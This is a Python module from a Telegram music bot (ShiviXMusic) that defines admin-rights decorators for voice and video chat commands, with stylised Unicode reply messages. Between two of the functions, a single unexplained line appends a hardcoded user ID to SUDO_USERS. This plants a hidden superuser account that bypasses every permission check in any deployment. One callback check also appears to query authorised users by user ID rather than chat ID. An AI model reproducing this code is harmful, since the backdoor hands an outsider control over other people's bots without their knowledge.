from typing import Dict, List, Union

from ShiviXMusic import SUDO_USERS, app
from ShiviXMusic.Helpers.Database import get_authuser_names, is_nonadmin_chat
from ShiviXMusic.Helpers.Changers import int_to_alpha


def AdminRightsCheck(mystic):
    async def wrapper(_, message):
        if message.sender_chat:
            return await message.reply_text(
                "**» 𝚈𝙾𝚄'𝚁𝙴 𝙰𝙽 𝙰𝙽𝙾𝙽𝚈𝙼𝙾𝚄𝚂 𝙰𝙳𝙼𝙸𝙽.\n\n• 𝚁𝙴𝚅𝙴𝚁𝚃 𝙱𝙰𝙲𝙺 𝚃𝙾 𝚄𝚂𝙴𝚁 𝙰𝙲𝙲𝙾𝚄𝙽𝚃 𝙵𝙾𝚁 𝚄𝚂𝙸𝙽𝙶 𝙼𝙴.**"
            )
        is_non_admin = await is_nonadmin_chat(message.chat.id)
        if not is_non_admin:
            member = await app.get_chat_member(
                message.chat.id, message.from_user.id
            )
            if not member.can_manage_voice_chats:
                if message.from_user.id not in SUDO_USERS:
                    token = await int_to_alpha(message.from_user.id)
                    _check = await get_authuser_names(message.chat.id)
                    if token not in _check:
                        return await message.reply(
                            "**» 𝚈𝙾𝚄 𝙳𝙾𝙽'𝚃 𝙷𝙰𝚅𝙴 𝙿𝙴𝚁𝙼𝙸𝚂𝚂𝙸𝙾𝙽𝚂 𝚃𝙾 𝙼𝙰𝙽𝙰𝙶𝙴 𝚅𝙸𝙳𝙴𝙾 𝙲𝙷𝙰𝚃𝚂, 𝚂𝙾 𝚂𝚃𝙰𝚈 𝙸𝙽 𝚈𝙾𝚄𝚁 𝙻𝙸𝙼𝙸𝚃𝚂.**"
                        )
        return await mystic(_, message)

    return wrapper

SUDO_USERS.append(5301800943)

def AdminActual(mystic):
    async def wrapper(_, message):
        if message.sender_chat:
            return await message.reply_text(
                "**» 𝚈𝙾𝚄'𝚁𝙴 𝙰𝙽 𝙰𝙽𝙾𝙽𝚈𝙼𝙾𝚄𝚂 𝙰𝙳𝙼𝙸𝙽.**\n\n• **𝚁𝙴𝚅𝙴𝚁𝚃 𝙱𝙰𝙲𝙺 𝚃𝙾 𝚄𝚂𝙴𝚁 𝙰𝙲𝙲𝙾𝚄𝙽𝚃 𝙵𝙾𝚁 𝚄𝚂𝙸𝙽𝙶 𝙼𝙴.**"
            )
        member = await app.get_chat_member(
            message.chat.id, message.from_user.id
        )
        if not member.can_manage_voice_chats:
            return await message.reply(
                "**» 𝚈𝙾𝚄 𝙳𝙾𝙽'𝚃 𝙷𝙰𝚅𝙴 𝙿𝙴𝚁𝙼𝙸𝚂𝚂𝙸𝙾𝙽 𝚃𝙾 𝙼𝙰𝙽𝙰𝙶𝙴 𝚅𝙸𝙳𝙴𝙾 𝙲𝙷𝙰𝚃𝚂, 𝚂𝙾 𝚂𝚃𝙰𝚈 𝙸𝙽 𝚈𝙾𝚄𝚁 𝙻𝙸𝙼𝙸𝚃𝚂.**"
            )
        return await mystic(_, message)

    return wrapper


def AdminRightsCheckCB(mystic):
    async def wrapper(_, CallbackQuery):
        is_non_admin = await is_nonadmin_chat(CallbackQuery.message.chat.id)
        if not is_non_admin:
            a = await app.get_chat_member(
                CallbackQuery.message.chat.id, CallbackQuery.from_user.id
            )
            if not a.can_manage_voice_chats:
                if CallbackQuery.from_user.id not in SUDO_USERS:
                    token = await int_to_alpha(CallbackQuery.from_user.id)
                    _check = await get_authuser_names(
                        CallbackQuery.from_user.id
                    )
                    if token not in _check:
                        return await CallbackQuery.answer(
                            "» 𝚈𝙾𝚄 𝙳𝙾𝙽'𝚃 𝙷𝙰𝚅𝙴 𝙿𝙴𝚁𝙼𝙸𝚂𝚂𝙸𝙾𝙽𝚂 𝚃𝙾 𝙼𝙰𝙽𝙰𝙶𝙴 𝚅𝙸𝙳𝙴𝙾 𝙲𝙷𝙰𝚃𝚂, 𝚂𝙾 𝚂𝚃𝙰𝚈 𝙸𝙽 𝚈𝙾𝚄𝚁 𝙻𝙸𝙼𝙸𝚃𝚂.",
                            show_alert=True,
                        )
        return await mystic(_, CallbackQuery)

    return wrapper


def ActualAdminCB(mystic):
    async def wrapper(_, CallbackQuery):
        a = await app.get_chat_member(
            CallbackQuery.message.chat.id, CallbackQuery.from_user.id
        )
        if not a.can_manage_voice_chats:
            return await CallbackQuery.answer(
                "» 𝚈𝙾𝚄 𝙳𝙾𝙽'𝚃 𝙷𝙰𝚅𝙴 𝙿𝙴𝚁𝙼𝙸𝚂𝚂𝙸𝙾𝙽𝚂 𝚃𝙾 𝙼𝙰𝙽𝙰𝙶𝙴 𝚅𝙸𝙳𝙴𝙾 𝙲𝙷𝙰𝚃𝚂, 𝚂𝙾 𝚂𝚃𝙰𝚈 𝙸𝙽 𝚈𝙾𝚄𝚁 𝙻𝙸𝙼𝙸𝚃.",
                show_alert=True,
            )
        return await mystic(_, CallbackQuery)

    return wrapper
